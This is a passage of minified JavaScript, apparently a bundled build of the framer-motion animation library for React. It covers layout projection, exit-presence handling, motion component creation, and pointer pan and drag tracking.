c)o.setStaticValue(u,c[u]),this.animationValues&&(this.animationValues[u]=c[u]);o.scheduleRender()}applyProjectionStyles(o,a){if(!this.instance||this.isSVG)return;if(!this.isVisible){o.visibility="hidden";return}const l=this.getTransformTemplate();if(this.needsReset){this.needsReset=!1,o.visibility="",o.opacity="",o.pointerEvents=Lo(a==null?void 0:a.pointerEvents)||"",o.transform=l?l(this.latestValues,""):"none";return}const c=this.getLead();if(!this.projectionDelta||!this.layout||!c.target){this.options.layoutId&&(o.opacity=this.latestValues.opacity!==void 0?this.latestValues.opacity:1,o.pointerEvents=Lo(a==null?void 0:a.pointerEvents)||""),this.hasProjected&&!_n(this.latestValues)&&(o.transform=l?l({},""):"none",this.hasProjected=!1);return}o.visibility="";const u=c.animationValues||c.latestValues;this.applyTransformsToTarget();let d=eA(this.projectionDeltaWithTransform,this.treeScale,u);l&&(d=l(u,d)),o.transform=d;const{x:h,y:m}=this.projectionDelta;o.transformOrigin=`${h.origin*100}% ${m.origin*100}% 0`,c.animationValues?o.opacity=c===this?u.opacity??this.latestValues.opacity??1:this.preserveOpacity?this.latestValues.opacity:u.opacityExit:o.opacity=c===this?u.opacity!==void 0?u.opacity:"":u.opacityExit!==void 0?u.opacityExit:0;for(const f in Eu){if(u[f]===void 0)continue;const{correct:v,applyTo:x,isCSSVariable:y}=Eu[f],g=d==="none"?u[f]:v(u[f],c);if(x){const b=x.length;for(let k=0;k<b;k++)o[x[k]]=g}else y?this.options.visualElement.renderState.vars[f]=g:o[f]=g}this.options.layoutId&&(o.pointerEvents=c===this?Lo(a==null?void 0:a.pointerEvents)||"":"none")}clearSnapshot(){this.resumeFrom=this.snapshot=void 0}resetTree(){this.root.nodes.forEach(o=>{var a;return(a=o.currentAnimation)==null?void 0:a.stop()}),this.root.nodes.forEach(Kf),this.root.sharedNodes.clear()}}}function hA(e){e.updateLayout()}function pA(e){var n;const t=((n=e.resumeFrom)==null?void 0:n.snapshot)||e.snapshot;if(e.isLead()&&e.layout&&t&&e.hasListeners("didUpdate")){const{layoutBox:s,measuredBox:r}=e.layout,{animationType:i}=e.options,o=t.source!==e.layout.source;if(i==="size")Et(d=>{const h=o?t.measuredBox[d]:t.layoutBox[d],m=Pe(h);h.min=s[d].min,h.max=h.min+m});else if(i==="x"||i==="y"){const d=i==="x"?"y":"x";Ru(o?t.measuredBox[d]:t.layoutBox[d],s[d])}else Jv(i,t.layoutBox,s)&&Et(d=>{const h=o?t.measuredBox[d]:t.layoutBox[d],m=Pe(s[d]);h.max=h.min+m,e.relativeTarget&&!e.currentAnimation&&(e.isProjectionDirty=!0,e.relativeTarget[d].max=e.relativeTarget[d].min+m)});const a=Ps();Br(a,s,t.layoutBox);const l=Ps();o?Br(l,e.applyTransform(r,!0),t.measuredBox):Br(l,s,t.layoutBox);const c=!Qv(a);let u=!1;if(!e.resumeFrom){const d=e.getClosestProjectingParent();if(d&&!d.resumeFrom){const{snapshot:h,layout:m}=d;if(h&&m){const f=e.options.layoutAnchor||void 0,v=de();xa(v,t.layoutBox,h.layoutBox,f);const x=de();xa(x,s,m.layoutBox,f),Gv(v,x)||(u=!0),d.options.layoutRoot&&(e.relativeTarget=x,e.relativeTargetOrigin=v,e.relativeParent=d)}}}e.notifyListeners("didUpdate",{layout:s,snapshot:t,delta:l,layoutDelta:a,hasLayoutChanged:c,hasRelativeLayoutChanged:u})}else if(e.isLead()){const{onExitComplete:s}=e.options;s&&s()}e.options.transition=void 0}function fA(e){e.parent&&(e.isProjecting()||(e.isProjectionDirty=e.parent.isProjectionDirty),e.isSharedProjectionDirty||(e.isSharedProjectionDirty=!!(e.isProjectionDirty||e.parent.isProjectionDirty||e.parent.isSharedProjectionDirty)),e.isTransformDirty||(e.isTransformDirty=e.parent.isTransformDirty))}function mA(e){e.isProjectionDirty=e.isSharedProjectionDirty=e.isTransformDirty=!1}function gA(e){e.clearSnapshot()}function Kf(e){e.clearMeasurements()}function yA(e){e.isLayoutDirty=!0,e.updateLayout()}function Yf(e){e.isLayoutDirty=!1}function wA(e){e.isAnimationBlocked&&e.layout&&!e.isLayoutDirty&&(e.snapshot=e.layout,e.isLayoutDirty=!0)}function vA(e){const{visualElement:t}=e.options;t&&t.getProps().onBeforeLayoutMeasure&&t.notify("BeforeLayoutMeasure"),e.resetTransform()}function Xf(e){e.finishAnimation(),e.targetDelta=e.relativeTarget=e.target=void 0,e.isProjectionDirty=!0}function bA(e){e.resolveTargetDelta()}function xA(e){e.calcProjection()}function kA(e){e.resetSkewAndRotation()}function SA(e){e.removeLeadSnapshot()}function Jf(e,t,n){e.translate=H(t.translate,0,n),e.scale=H(t.scale,1,n),e.origin=t.origin,e.originPoint=t.originPoint}function Zf(e,t,n,s){e.min=H(t.min,n.min,s),e.max=H(t.max,n.max,s)}function TA(e,t,n,s){Zf(e.x,t.x,n.x,s),Zf(e.y,t.y,n.y,s)}function CA(e){return e.animationValues&&e.animationValues.opacityExit!==void 0}const AA={duration:.45,ease:[.4,0,.1,1]},em=e=>typeof navigator<"u"&&navigator.userAgent&&navigator.userAgent.toLowerCase().includes(e),tm=em("applewebkit/")&&!em("chrome/")?Math.round:Ye;function nm(e){e.min=tm(e.min),e.max=tm(e.max)}function EA(e){nm(e.x),nm(e.y)}function Jv(e,t,n){return e==="position"||e==="preserve-aspect"&&!GC(zf(t),zf(n),.2)}function RA(e){var t;return e!==e.root&&((t=e.scroll)==null?void 0:t.wasRoot)}const PA=Xv({attachResizeListener:(e,t)=>pi(e,"resize",t),measureScroll:()=>{var e,t;return{x:document.documentElement.scrollLeft||((e=document.body)==null?void 0:e.scrollLeft)||0,y:document.documentElement.scrollTop||((t=document.body)==null?void 0:t.scrollTop)||0}},checkIsScrollRoot:()=>!0}),Bl={current:void 0},Zv=Xv({measureScroll:e=>({x:e.scrollLeft,y:e.scrollTop}),defaultParent:()=>{if(!Bl.current){const e=new PA({});e.mount(window),e.setOptions({layoutScroll:!0}),Bl.current=e}return Bl.current},resetTransform:(e,t)=>{e.style.transform=t!==void 0?t:"none"},checkIsScrollRoot:e=>window.getComputedStyle(e).position==="fixed"}),ar=w.createContext({transformPagePoint:e=>e,isStatic:!1,reducedMotion:"never"});function sm(e,t){if(typeof e=="function")return e(t);e!=null&&(e.current=t)}function qA(...e){return t=>{let n=!1;const s=e.map(r=>{const i=sm(r,t);return!n&&typeof i=="function"&&(n=!0),i});if(n)return()=>{for(let r=0;r<s.length;r++){const i=s[r];typeof i=="function"?i():sm(e[r],null)}}}}function OA(...e){return w.useCallback(qA(...e),e)}class IA extends w.Component{getSnapshotBeforeUpdate(t){const n=this.props.childRef.current;if(Fr(n)&&t.isPresent&&!this.props.isPresent&&this.props.pop!==!1){const s=n.offsetParent,r=Fr(s)&&s.offsetWidth||0,i=Fr(s)&&s.offsetHeight||0,o=getComputedStyle(n),a=this.props.sizeRef.current;a.height=parseFloat(o.height),a.width=parseFloat(o.width),a.top=n.offsetTop,a.left=n.offsetLeft,a.right=r-a.width-a.left,a.bottom=i-a.height-a.top,a.direction=o.direction}return null}componentDidUpdate(){}render(){return this.props.children}}function NA({children:e,isPresent:t,anchorX:n,anchorY:s,root:r,pop:i}){var h;const o=w.useId(),a=w.useRef(null),l=w.useRef({width:0,height:0,top:0,left:0,right:0,bottom:0,direction:"ltr"}),{nonce:c}=w.useContext(ar),u=i!==!1?((h=e.props)==null?void 0:h.ref)??(e==null?void 0:e.ref):void 0,d=OA(a,u);return w.useInsertionEffect(()=>{const{width:m,height:f,top:v,left:x,right:y,bottom:g,direction:b}=l.current;if(t||i===!1||!a.current||!m||!f)return;const k=b==="rtl",C=n==="left"?k?`right: ${y}`:`left: ${x}`:k?`left: ${x}`:`right: ${y}`,E=s==="bottom"?`bottom: ${g}`:`top: ${v}`;a.current.dataset.motionPopId=o;const S=document.createElement("style");c&&(S.nonce=c);const T=r??document.head;return T.appendChild(S),S.sheet&&S.sheet.insertRule(`
          [data-motion-pop-id="${o}"] {
            position: absolute !important;
            width: ${m}px !important;
            height: ${f}px !important;
            ${C}px !important;
            ${E}px !important;
          }
        `),()=>{var q;(q=a.current)==null||q.removeAttribute("data-motion-pop-id"),T.contains(S)&&T.removeChild(S)}},[t]),p.jsx(IA,{isPresent:t,childRef:a,sizeRef:l,pop:i,children:i===!1?e:w.cloneElement(e,{ref:d})})}const jA=({children:e,initial:t,isPresent:n,onExitComplete:s,custom:r,presenceAffectsLayout:i,mode:o,anchorX:a,anchorY:l,root:c})=>{const u=Cn(MA),d=w.useId(),h=w.useRef(n),m=w.useRef(s);Ys(()=>{h.current=n,m.current=s});let f=!0,v=w.useMemo(()=>(f=!1,{id:d,initial:t,isPresent:n,custom:r,onExitComplete:x=>{u.set(x,!0);for(const y of u.values())if(!y)return;s&&s()},register:x=>(u.set(x,!1),()=>{var y;u.delete(x),!h.current&&!u.size&&((y=m.current)==null||y.call(m))})}),[n,u,s]);return i&&f&&(v={...v}),w.useMemo(()=>{u.forEach((x,y)=>u.set(y,!1))},[n]),w.useEffect(()=>{!n&&!u.size&&s&&s()},[n]),e=p.jsx(NA,{pop:o==="popLayout",isPresent:n,anchorX:a,anchorY:l,root:c,children:e}),p.jsx(Ha.Provider,{value:v,children:e})};function MA(){return new Map}function eb(e=!0){const t=w.useContext(Ha);if(t===null)return[!0,null];const{isPresent:n,onExitComplete:s,register:r}=t,i=w.useId();w.useEffect(()=>{if(e)return r(i)},[e]);const o=w.useCallback(()=>e&&s&&s(i),[i,s,e]);return!n&&s?[!1,o]:[!0]}const ro=e=>e.key||"";function rm(e){const t=[];return w.Children.forEach(e,n=>{w.isValidElement(n)&&t.push(n)}),t}const Pu=({children:e,custom:t,initial:n=!0,onExitComplete:s,presenceAffectsLayout:r=!0,mode:i="sync",propagate:o=!1,anchorX:a="left",anchorY:l="top",root:c})=>{const[u,d]=eb(o),h=w.useMemo(()=>rm(e),[e]),m=o&&!u?[]:h.map(ro),f=w.useRef(!0),v=w.useRef(h),x=Cn(()=>new Map),y=w.useRef(new Set),[g,b]=w.useState(h),[k,C]=w.useState(h);Ys(()=>{o&&!u&&!k.length&&(d==null||d())},[u,o,k.length,d]),Ys(()=>{f.current=!1,v.current=h;for(let T=0;T<k.length;T++){const q=ro(k[T]);m.includes(q)?(x.delete(q),y.current.delete(q)):x.get(q)!==!0&&x.set(q,!1)}},[k,m.length,m.join("-")]);const E=[];if(h!==g){let T=[...h],q=0;for(const R of k){const M=m.indexOf(ro(R));M===-1?(T.splice(q++,0,R),E.push(R)):q=M+E.length+1}return i==="wait"&&E.length&&(T=E),C(rm(T)),b(h),null}const{forceRender:S}=w.useContext(Bd);return p.jsx(p.Fragment,{children:k.map(T=>{const q=ro(T),R=o&&!u?!1:h===k||m.includes(q),M=()=>{if(y.current.has(q))return;if(x.has(q))y.current.add(q),x.set(q,!0);else return;let Q=!0;x.forEach($=>{$||(Q=!1)}),Q&&(S==null||S(),C(v.current),o&&(d==null||d()),s&&s())};return p.jsx(jA,{isPresent:R,initial:!f.current||n?void 0:!1,custom:t,presenceAffectsLayout:r,mode:i,root:c,onExitComplete:R?void 0:M,anchorX:a,anchorY:l,children:T},q)})})},tb=w.createContext({strict:!1}),im={animation:["animate","variants","whileHover","whileTap","exit","whileInView","whileFocus","whileDrag"],exit:["exit"],drag:["drag","dragControls"],focus:["whileFocus"],hover:["whileHover","onHoverStart","onHoverEnd"],tap:["whileTap","onTap","onTapStart","onTapCancel"],pan:["onPan","onPanStart","onPanSessionStart","onPanEnd"],inView:["whileInView","onViewportEnter","onViewportLeave"],layout:["layout","layoutId"]};let om=!1;function LA(){if(om)return;const e={};for(const t in im)e[t]={isEnabled:n=>im[t].some(s=>!!n[s])};Lv(e),om=!0}function nb(){return LA(),OC()}function DA(e){const t=nb();for(const n in e)t[n]={...t[n],...e[n]};Lv(t)}const Ja=w.createContext({});function _A(e,t){if(Xa(e)){const{initial:n,animate:s}=e;return{initial:n===!1||hi(n)?n:void 0,animate:hi(s)?s:void 0}}return e.inherit!==!1?t:{}}function FA(e){const{initial:t,animate:n}=_A(e,w.useContext(Ja));return w.useMemo(()=>({initial:t,animate:n}),[am(t),am(n)])}function am(e){return Array.isArray(e)?e.join(" "):e}const yh=()=>({style:{},transform:{},transformOrigin:{},vars:{}});function sb(e,t,n){for(const s in t)!me(t[s])&&!Fv(s,n)&&(e[s]=t[s])}function BA({transformTemplate:e},t){return w.useMemo(()=>{const n=yh();return hh(n,t,e),Object.assign({},n.vars,n.style)},[t])}function VA(e,t){const n=e.style||{},s={};return sb(s,n,e),Object.assign(s,BA(e,t)),s}function WA(e,t){const n={},s=VA(e,t);return e.drag&&e.dragListener!==!1&&(n.draggable=!1,s.userSelect=s.WebkitUserSelect=s.WebkitTouchCallout="none",s.touchAction=e.drag===!0?"none":`pan-${e.drag==="x"?"y":"x"}`),e.tabIndex===void 0&&(e.onTap||e.onTapStart||e.whileTap)&&(n.tabIndex=0),n.style=s,n}const rb=()=>({...yh(),attrs:{}});function UA(e,t,n,s){const r=w.useMemo(()=>{const i=rb();return Sv(i,t,Vv(s),e.transformTemplate,e.style),{...i.attrs,style:{...i.style}}},[t]);if(e.style){const i={};sb(i,e.style,e),r.style={...i,...r.style}}return r}const zA=new Set(["animate","exit","variants","initial","style","values","variants","transition","transformTemplate","custom","inherit","onBeforeLayoutMeasure","onAnimationStart","onAnimationComplete","onUpdate","onDragStart","onDrag","onDragEnd","onMeasureDragConstraints","onDirectionLock","onDragTransitionEnd","_dragX","_dragY","onHoverStart","onHoverEnd","onViewportEnter","onViewportLeave","globalTapTarget","propagate","ignoreStrict","viewport"]);function ka(e){return e.startsWith("while")||e.startsWith("drag")&&e!=="draggable"||e.startsWith("layout")||e.startsWith("onTap")||e.startsWith("onPan")||e.startsWith("onLayout")||zA.has(e)}function $A(e,t){return e.startsWith("on")?!ka(e):(t==null?void 0:t(e))??!ka(e)}function HA(e,t,n,s){const r={};for(const i in e)i==="values"&&typeof e.values=="object"||me(e[i])||($A(i,s)||n===!0&&ka(i)||!t&&!ka(i)||e.draggable&&i.startsWith("onDrag"))&&(r[i]=e[i]);return r}const QA=["animate","circle","defs","desc","ellipse","g","image","line","filter","marker","mask","metadata","path","pattern","polygon","polyline","rect","stop","switch","symbol","svg","text","tspan","use","view"];function wh(e){return typeof e!="string"||e.includes("-")?!1:!!(QA.indexOf(e)>-1||/[A-Z]/u.test(e))}function GA(e,t,n,{latestValues:s},r,i=!1,o,a){const c=(o??wh(e)?UA:WA)(t,s,r,e),u=HA(t,typeof e=="string",i,a),d=e!==w.Fragment?{...u,...c,ref:n}:{},{children:h}=t,m=w.useMemo(()=>me(h)?h.get():h,[h]);return w.createElement(e,{...d,children:m})}function KA({scrapeMotionValuesFromProps:e,createRenderState:t},n,s,r){return{latestValues:YA(n,s,r,e),renderState:t()}}function YA(e,t,n,s){const r={},i=s(e,{});for(const h in i)r[h]=Lo(i[h]);let{initial:o,animate:a}=e;const l=Xa(e),c=jv(e);t&&c&&!l&&e.inherit!==!1&&(o===void 0&&(o=t.initial),a===void 0&&(a=t.animate));let u=n?n.initial===!1:!1;u=u||o===!1;const d=u?a:o;if(d&&typeof d!="boolean"&&!Ya(d)){const h=Array.isArray(d)?d:[d];for(let m=0;m<h.length;m++){const f=lh(e,h[m]);if(f){const{transitionEnd:v,transition:x,...y}=f;for(const g in y){let b=y[g];if(Array.isArray(b)){const k=u?b.length-1:0;b=b[k]}b!==null&&(r[g]=b)}for(const g in v)r[g]=v[g]}}}return r}const ib=e=>(t,n)=>{const s=w.useContext(Ja),r=w.useContext(Ha),i=()=>KA(e,t,s,r);return n?i():Cn(i)},XA=ib({scrapeMotionValuesFromProps:gh,createRenderState:yh}),JA=ib({scrapeMotionValuesFromProps:Wv,createRenderState:rb}),ZA=Symbol.for("motionComponentSymbol");function eE(e,t,n){const s=w.useRef(n);w.useInsertionEffect(()=>{s.current=n});const r=w.useRef(null);return w.useCallback(i=>{var a;i&&((a=e.onMount)==null||a.call(e,i)),t&&(i?t.mount(i):t.unmount());const o=s.current;if(typeof o=="function")if(i){const l=o(i);typeof l=="function"&&(r.current=l)}else r.current?(r.current(),r.current=null):o(i);else o&&(o.current=i)},[t])}const ob=w.createContext({});function ps(e){return e&&typeof e=="object"&&Object.prototype.hasOwnProperty.call(e,"current")}function tE(e,t,n,s,r,i){var b,k;const{visualElement:o}=w.useContext(Ja),a=w.useContext(tb),l=w.useContext(Ha),c=w.useContext(ar),u=c.reducedMotion,d=c.skipAnimations,h=w.useRef(null),m=w.useRef(!1);s=s||a.renderer,!h.current&&s&&(h.current=s(e,{visualState:t,parent:o,props:n,presenceContext:l,blockInitialAnimation:l?l.initial===!1:!1,reducedMotionConfig:u,skipAnimations:d,isSVG:i}),m.current&&h.current&&(h.current.manuallyAnimateOnMount=!0));const f=h.current,v=w.useContext(ob);f&&!f.projection&&r&&(f.type==="html"||f.type==="svg")&&nE(h.current,n,r,v);const x=w.useRef(!1);w.useInsertionEffect(()=>{f&&x.current&&f.update(n,l)});const y=n[wv],g=w.useRef(!!y&&typeof window<"u"&&!((b=window.MotionHandoffIsComplete)!=null&&b.call(window,y))&&((k=window.MotionHasOptimisedAnimation)==null?void 0:k.call(window,y)));return Ys(()=>{m.current=!0,f&&(x.current=!0,window.MotionIsMounted=!0,f.updateFeatures(),f.scheduleRenderMicrotask(),g.current&&f.animationState&&f.animationState.animateChanges())}),w.useEffect(()=>{f&&(!g.current&&f.animationState&&f.animationState.animateChanges(),g.current&&(queueMicrotask(()=>{var C;(C=window.MotionHandoffMarkAsComplete)==null||C.call(window,y)}),g.current=!1),f.enteringChildren=void 0)}),f}function nE(e,t,n,s){const{layoutId:r,layout:i,drag:o,dragConstraints:a,layoutScroll:l,layoutRoot:c,layoutAnchor:u,layoutCrossfade:d}=t;e.projection=new n(e.latestValues,t["data-framer-portal-id"]?void 0:ab(e.parent)),e.projection.setOptions({layoutId:r,layout:i,alwaysMeasureLayout:!!o||a&&ps(a),visualElement:e,animationType:typeof i=="string"?i:"both",initialPromotionConfig:s,crossfade:d,layoutScroll:l,layoutRoot:c,layoutAnchor:u})}function ab(e){if(e)return e.options.allowProjection!==!1?e.projection:ab(e.parent)}function Vl(e,{forwardMotionProps:t=!1,type:n}={},s,r){s&&DA(s);const i=n?n==="svg":wh(e),o=i?JA:XA;function a(c,u){let d;const h={...w.useContext(ar),...c,layoutId:sE(c)},{isStatic:m,isValidProp:f}=h,v=FA(c),x=o(c,m);if(!m&&typeof window<"u"){rE();const y=iE(h);d=y.MeasureLayout,v.visualElement=tE(e,x,h,r,y.ProjectionNode,i)}return p.jsxs(Ja.Provider,{value:v,children:[d&&v.visualElement?p.jsx(d,{visualElement:v.visualElement,...h}):null,GA(e,c,eE(x,v.visualElement,u),x,m,t,i,f)]})}a.displayName=`motion.${typeof e=="string"?e:`create(${e.displayName??e.name??""})`}`;const l=w.forwardRef(a);return l[ZA]=e,l}function sE({layoutId:e}){const t=w.useContext(Bd).id;return t&&e!==void 0?t+"-"+e:e}function rE(e,t){w.useContext(tb).strict}function iE(e){const t=nb(),{drag:n,layout:s}=t;if(!n&&!s)return{};const r={...n,...s};return{MeasureLayout:n!=null&&n.isEnabled(e)||s!=null&&s.isEnabled(e)?r.MeasureLayout:void 0,ProjectionNode:r.ProjectionNode}}function oE(e,t){if(typeof Proxy>"u")return Vl;const n=new Map,s=(i,o)=>Vl(i,o,e,t),r=(i,o)=>s(i,o);return new Proxy(r,{get:(i,o)=>o==="create"?s:(n.has(o)||n.set(o,Vl(o,void 0,e,t)),n.get(o))})}const aE=(e,t)=>t.isSVG??wh(e)?new DC(t):new MC(t,{allowProjection:e!==w.Fragment});class lE extends On{constructor(t){super(t),t.animationState||(t.animationState=WC(t))}updateAnimationControlsSubscription(){const{animate:t}=this.node.getProps();Ya(t)&&(this.unmountControls=t.subscribe(this.node))}mount(){this.updateAnimationControlsSubscription()}update(){const{animate:t}=this.node.getProps(),{animate:n}=this.node.prevProps||{};t!==n&&this.updateAnimationControlsSubscription()}unmount(){var t;this.node.animationState.reset(),(t=this.unmountControls)==null||t.call(this)}}let cE=0;class uE extends On{constructor(){super(...arguments),this.id=cE++,this.isExitComplete=!1}update(){var i;if(!this.node.presenceContext)return;const{isPresent:t,onExitComplete:n}=this.node.presenceContext,{isPresent:s}=this.node.prevPresenceContext||{};if(!this.node.animationState||t===s)return;if(t&&s===!1){if(this.isExitComplete){const{initial:o,custom:a}=this.node.getProps();if(typeof o=="string"||typeof o=="object"&&o!==null&&!Array.isArray(o)){const l=Yn(this.node,o,a);if(l){const{transition:c,transitionEnd:u,...d}=l;for(const h in d)(i=this.node.getValue(h))==null||i.jump(d[h])}}this.node.animationState.reset(),this.node.animationState.animateChanges()}else this.node.animationState.setActive("exit",!1);this.isExitComplete=!1;return}const r=this.node.animationState.setActive("exit",!t);n&&!t&&r.then(()=>{this.isExitComplete=!0,n(this.id)})}mount(){const{register:t,onExitComplete:n}=this.node.presenceContext||{};n&&n(this.id),t&&(this.unmount=t(this.id))}unmount(){}}const dE={animation:{Feature:lE},exit:{Feature:uE}};function Pi(e){return{point:{x:e.pageX,y:e.pageY}}}const hE=e=>t=>ph(t)&&e(t,Pi(t));function Vr(e,t,n,s){return pi(e,t,hE(n),s)}const lb=({current:e})=>e?e.ownerDocument.defaultView:null,lm=(e,t)=>Math.abs(e-t);function pE(e,t){const n=lm(e.x,t.x),s=lm(e.y,t.y);return Math.sqrt(n**2+s**2)}const cm=new Set(["auto","scroll"]);class cb{constructor(t,n,{transformPagePoint:s,contextWindow:r=window,dragSnapToOrigin:i=!1,distanceThreshold:o=3,element:a}={}){if(this.startEvent=null,this.lastMoveEvent=null,this.lastMoveEventInfo=null,this.lastRawMoveEventInfo=null,this.handlers={},this.contextWindow=window,this.scrollPositions=new Map,this.removeScrollListeners=null,this.onElementScroll=f=>{this.handleScroll(f.target)},this.onWindowScroll=()=>{this.handleScroll(window)},this.updatePoint=()=>{if(!(this.lastMoveEvent&&this.lastMoveEventInfo))return;this.lastRawMoveEventInfo&&(this.lastMoveEventInfo=io(this.lastRawMoveEventInfo,this.transformPagePoint));const f=Wl(this.lastMoveEventInfo,this.history),v=this.startEvent!==null,x=pE(f.offset,{x:0,y:0})>=this.distanceThreshold;if(!v&&!x)return;const{point:y}=f,{timestamp:g}=ce;this.history.push({...y,timestamp:g});const{onStart:b,onMove:k}=this.handlers;v||(b&&b(this.lastMoveEvent,f),this.startEvent=this.lastMoveEvent),k&&k(this.lastMoveEvent,f)},this.handlePointerMove=(f,v)=>{this.lastMoveEvent=f,this.lastRawMoveEventInfo=v,this.lastMoveEventInfo=io(v,this.transformPagePoint),B.update(this.updatePoint,!0)},this.handlePointerUp=(f,v)=>{this.end();const{onEnd:x,onSessionEnd:y,resumeAnimation:g}=this.handlers;if((this.dragSnapToOrigin||!this.startEvent)&&g&&g(),!(this.lastMoveEvent&&this.lastMoveEventInfo))return;const b=Wl(f.type==="pointercancel"?this.lastMoveEventInfo:io(v,this.transformPagePoint),this.history);this.startEvent&&x&&x(f,b),y&&y(f,b)},!ph(t))return;this.dragSnapToOrigin=i,this.handlers=n,this.transformPagePoint=s,this.distanceThreshold=o,this.contextWindow=r||window;const l=Pi(t),c=io(l,this.transformPagePoint),{point:u}=c,{timestamp:d}=ce;this.history=[{...u,timestamp:d}];const{onSessionStart:h}=n;h&&h(t,Wl(c,this.history));const m={passive:!0,capture:!0};this.removeListeners=Ai(Vr(this.contextWindow,"pointermove",this.handlePointerMove,m),Vr(this.contextWindow,"pointerup",this.handlePointerUp,m),Vr(this.contextWindow,"pointercancel",this.handlePointerUp,m)),a&&this.startScrollTracking(a)}startScrollTracking(t){let n=t.parentElement;for(;n;){const s=getComputedStyle(n);(cm.has(s.overflowX)||cm.has(s.overflowY))&&this.scrollPositions.set(n,{x:n.scrollLeft,y:n.scrollTop}),n=n.parentElement}this.scrollPositions.set(window,{x:window.scrollX,y:window.scrollY}),window.addEventListener("scroll",this.onElementScroll,{capture:!0}),window.addEventListener("scroll",this.onWindowScroll),this.removeScrollListeners=()=>{window.removeEventListener("scroll",this.onElementScroll,{capture:!0}),window.removeEventListener("scroll",this.onWindowScroll)}}handleScroll(t){const n=this.scrollPositions.get(t);if(!n)return;const s=t===window,r=s?{x:window.scrollX,y:window.scrollY}:{x:t.scrollLeft,y:t.scrollTop},i={x:r.x-n.x,y:r.y-n.y};i.x===0&&i.y===0||(s?this.lastMoveEventInfo&&(this.lastMoveEventInfo.point.x+=i.x,this.lastMoveEventInfo.point.y+=i.y):this.history.length>0&&(this.history[0].x-=i.x,this.history[0].y-=i.y),this.scrollPositions.set(t,r),B.update(this.updatePoint,!0))}updateHandlers(t){this.handlers=t}end(){this.removeListeners&&this.removeListeners(),this.removeScrollListeners&&this.removeScrollListeners(),this.scrollPositions.clear(),We(this.updatePoint)}}function io(e,t){return t?{point:t(e.point)}:e}function um(e,t){return{x:e.x-t.x,y:e.y-t.y}}function Wl({point:e},t){return{point:e,delta:um(e,ub(t)),offset:um(e,fE(t)),velocity:mE(t,.1)}}function fE(e){return e[0]}function ub(e){return e[e.length-1]}function mE(e,t){if(e.length<2)return{x:0,y:0};let n=e.length-1,s=null;const r=ub(e);for(;n>=0&&(s=e[n],!(r.timestamp-s.timestamp>at(t)));)n--;if(!s)return{x:0,y:0};s===e[0]&&e.length>2&&r.timestamp-s.timestamp>at(t)*2&&(s=e[1]);const i=Ge(r.timestamp-s.timestamp);if(i===0)return{x:0,y:0};const o={x:(r.x-s.x)/i,y:(r.y-s.y)/i};return o.x===1/0&&(o.x=0),o.y===1/0&&(o.y=0),o}function gE(e,{min:t,max:n},s){return t!==void 0&&e<t?e=s?H(t,e,s.min):Math.max(e,t):n!==void 0&&e>n&&(e=s?H(n,e,s.max):Math.min(e,n)),e}function dm(e,t,n){return{min:t!==void 0?e.min+t:void 0,max:n!==void 0?e.max+n-(e.max-e.min):void 0}}function yE(e,{top:t,left:n,bottom:s,right:r}){return{x:dm(e.x,n,r),y:dm(e.y,t,s)}}function hm(e,t){let n=t.min-e.min,s=t.max-e.max;return t.max-t.min<e.max-e.min&&([n,s]=[s,n]),{min:n,max:s}}function wE(e,t){return{x:hm(e.x,t.x),y:hm(e.y,t.y)}}function vE(e,t){let n=.5;const s=Pe(e),r=Pe(t);return r>s?n=Xs(t.min,t.max-s,e.min):s>r&&(n=Xs(e.min,e.max-r,t.min)),ut(0,1,n)}function bE(e,t){const n={};return t.min!==void 0&&(n.min=t.min-e.min),t.max!==void 0&&(n.max=t.max-e.min),n}const qu=.35;function xE(e=qu){return e===!1?e=0:e===!0&&(e=qu),{x:pm(e,"left","right"),y:pm(e,"top","bottom")}}function pm(e,t,n){return{min:fm(e,t),max:fm(e,n)}}function fm(e,t){return typeof e=="number"?e:e[t]||0}const kE=new WeakMap;class SE{constructor(t){this.openDragLock=null,this.isDragging=!1,this.currentDirection=null,this.originPoint={x:0,y:0},this.constraints=!1,this.hasMutatedConstraints=!1,this.elastic=de(),this.latestPointerEvent=null,this.latestPanInfo=null,this.visualElement=t}start(t,{snapToCursor:n=!1,distanceThreshold:s}={}){const{presenceContext:r}=this.visualElement;if(r&&r.isPresent===!1)return;const i=d=>{n&&this.snapToCursor(Pi(d).point),this.stopAnimation()},o=(d,h)=>{const{drag:m,dragPropagation:f,onDragStart:v}=this.getProps();if(m&&!f&&(this.openDragLock&&this.openDragLock(),this.openDragLock=aC(m),!this.openDragLock))return;this.latestPointerEvent=d,this.latestPanInfo=h,this.isDragging=!0,this.currentDirection=null,this.resolveConstraints(),this.visualElement.projection&&(this.visualElement.projection.isAnimationBlocked=!0,this.visualElement.projection.target=void 0),Et(y=>{let g=this.getAxisMotionValue(y).get()||0;if(Mt.test(g)){const{projection:b}=this.visualElement;if(b&&b.layout){const k=b.layout.layoutBox[y];k&&(g=Pe(k)*(parseFloat(g)/100))}}this.originPoint[y]=g}),v&&B.update(()=>v(d,h),!1,!0),xu(this.visualElement,"transform");const{animationState:x}=this.visualElement;x&&x.setActive("whileDrag",!0)},a=(d,h)=>{this.latestPointerEvent=d,this.latestPanInfo=h;const{dragPropagation:m,dragDirectionLock:f,onDirectionLock:v,onDrag:x}=this.getProps();if(!m&&!this.openDragLock)return;const{offset:y}=h;if(f&&this.currentDirection===null){this.currentDirection=CE(y),this.currentDirection!==null&&v&&v(this.currentDirection);return}this.updateAxis("x",h.point,y),this.updateAxis("y",h.point,y),this.visualElement.render(),x&&B.update(()=>x(d,h),!1,!0)},l=(d,h)=>{this.latestPointerEvent=d,this.latestPanInfo=h,this.stop(d,h),this.latestPointerEvent=null,this.latestPanInfo=null},c=()=>{const{dragSnapToOrigin:d}=this.getProps();(d||this.constraints)&&this.startAnimation({x:0,y:0})},{dragSnapToOrigin:u}=this.getProps();this.panSession=new cb(t,{onSessionStart:i,onStart:o,onMove:a,onSessionEnd:l,resumeAnimation:c},{transformPagePoint:this.visualElement.getTransformPagePoint(),dragSnapToOrigin:u,distanceThreshold:s,contextWindow:lb(this.visualElement),element:this.visualElement.current})}stop(t,n){const s=t||this.latestPointerEvent,r=n||this.latestPanInfo,i=this.isDragging;if(this.cancel(),!i||!r||!s)return;const{velocity:o}=r;this.startAnimation(o);const{onDragEnd:a}=this.getProps();a&&B.postRender(()=>a(s,r))}cancel(){this.isDragging=!1;const{projection:t,animationState:n}=this.visualElement;t&&(t.isAnimationBlocked=!1),this.endPanSession();const{dragPropagation:s}=this.getProps();!s&&this.openDragLock&&(this.openDragLock(),this.openDragLock=null),n&&n.setActive("whileDrag",!1)}endPanSession(){this.panSession&&this.panSession.end(),this.panSession=void 